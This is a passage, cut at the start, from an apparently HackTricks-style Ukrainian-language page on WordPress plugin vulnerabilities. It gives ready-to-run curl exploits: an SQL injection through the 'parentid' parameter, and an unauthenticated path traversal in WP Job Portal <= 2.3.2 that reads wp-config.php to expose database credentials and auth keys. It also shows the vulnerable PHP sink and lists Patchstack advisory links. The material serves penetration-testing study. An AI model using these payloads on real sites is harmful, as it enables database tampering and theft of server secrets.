2. Впровадьте довільний SQL, зловживаючи `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
Відповідь видає результат ін'єкції запиту або змінює базу даних, що доводить наявність SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Ще одне завдання, **downloadcustomfile**, дозволяло відвідувачам завантажувати **будь-який файл на диску** через path traversal. Уразливий sink знаходиться в `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` контролюється атакуючим і конкатенується **без санітизації**.  Знову ж, єдиним бар'єром є **CSRF nonce**, який можна отримати зі сторінки резюме.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Сервер повертає вміст файлу `wp-config.php`, внаслідок чого розкриваються DB credentials і auth keys.

## Посилання

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset – delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ≤ 5.6.1 – Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation – Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
